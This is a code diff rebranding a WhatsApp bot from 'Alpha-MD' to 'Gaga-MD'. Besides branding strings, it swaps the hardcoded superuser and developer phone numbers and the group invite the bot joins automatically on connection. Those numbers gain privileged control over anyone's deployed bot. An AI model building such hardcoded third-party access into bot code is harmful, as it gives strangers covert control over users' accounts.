@@ -73,7 +73,7 @@ const {
   atbverifierEtatJid,
   atbrecupererActionJid
 } = require("./bdd/antibot");
-let evt = require(__dirname + "/keizzah/keith");
+let evt = require(__dirname + "/Xgaga");
 const {
   isUserBanned,
   addUserToBanList,
@@ -94,7 +94,7 @@ const {
 let {
   reagir
 } = require(__dirname + "/keizzah/app");
-var session = conf.session.replace(/ALPHA-MD;;;=>/g, "");
+var session = conf.session.replace(/GAGA-MD;;;=>/g, "");
 const prefixe = conf.PREFIXE;
 require('dotenv').config({
   'path': "./config.env"
@@ -140,7 +140,7 @@ setTimeout(() => {
       logger: pino({
         level: "silent"
       }),
-      browser: ['ALPHA-MD', "safari", "1.0.0"],
+      browser: ['GAGA-MD', "safari", "1.0.0"],
       printQRInTerminal: true,
       fireInitQueries: false,
       shouldSyncHistoryMessage: true,
@@ -179,7 +179,7 @@ setTimeout(() => {
         const callerId = callData[0].from;
         await zk.rejectCall(callId, callerId);
         await zk.sendMessage(callerId, {
-          text: "```❗📵I AM ALPHA MD | I REJECT THIS CALL BECAUSE MY OWNER IS BUSY.KINDLY SEND TEXT INSTEAD``` ."
+          text: "```❗📵I AM GAGA MD | I REJECT THIS CALL BECAUSE MY OWNER IS BUSY.KINDLY SEND TEXT INSTEAD``` ."
         });
       }
     });
@@ -316,7 +316,7 @@ zk.ev.on("messages.upsert", async m => {
       const senderNumber = sender.split('@')[0];
 
       // Update the auto-reply message dynamically
-      auto_reply_message = `Hello @${senderNumber}, A brief departure is on the horizon, but I shall return posthaste. Please bear with me for a fleeting moment, and I’ll rejoin you shortly \n\n*powered by Alpha Md*.`;
+      auto_reply_message = `Hello @${senderNumber}, A brief departure is on the horizon, but I shall return posthaste. Please bear with me for a fleeting moment, and I’ll rejoin you shortly \n\n*powered by Gaga Md*.`;
 
       // Check if the message exists and is a command to set a new auto-reply message with any prefix
       if (messageText.match(/^[^\w\s]/) && ms.key.fromMe) {
@@ -688,10 +688,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254748387615", '254110190196', '254748387615', "254796299159", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254112291443", '254729269118', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '254748387615', "254796299159", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254112291443', '254729269118'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -699,7 +699,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
           quoted: ms
         });
       }
-      console.log("\t [][]...{Alpha-Md}...[][]");
+      console.log("\t [][]...{Gaga-Md}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -1090,7 +1090,7 @@ if (conf.ANTILINK === "yes") {
           // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
 
           var sticker = new Sticker("https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif", {
-            pack: 'Alpha-Md',
+            pack: 'Gaga-Md',
             author: conf.OWNER_NAME,
             type: StickerTypes.FULL,
             categories: ['🤩', '🎉'],
@@ -1377,7 +1377,7 @@ if (conf.ANTILINK === "yes") {
       if (connection === "connecting") {
         console.log("ℹ️ Alpha md connecting in your account...");
       } else if (connection === 'open') {
-        await zk.groupAcceptInvite("DvXonepPp1XBPOYIBziTl1");
+        await zk.groupAcceptInvite("EcbqrI0Me6H0oHtcGB8SxU");
         console.log("✅ Alpha Md connected successfully✔");
         console.log("--");
         0;
@@ -1417,8 +1417,8 @@ if (conf.ANTILINK === "yes") {
         if (conf.DP.toLowerCase() === 'yes') {
           await zk.sendMessage(zk.user.id, {
             text: `╭════⊷
-║ *『𝐀𝐋𝐏𝐇𝐀-𝐌𝐃 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
-║    Creator: *keithkeizzah*
+║ *『GAGA-𝐌𝐃 𝐢𝐬 𝐎𝐧𝐥𝐢𝐧𝐞』*
+║    Creator: *Gaga*
 ║    Prefix : [  ${prefixe} ]
 ║    Mode : ${md} mode
 ║    Total Commands : ${evt.cm.length}
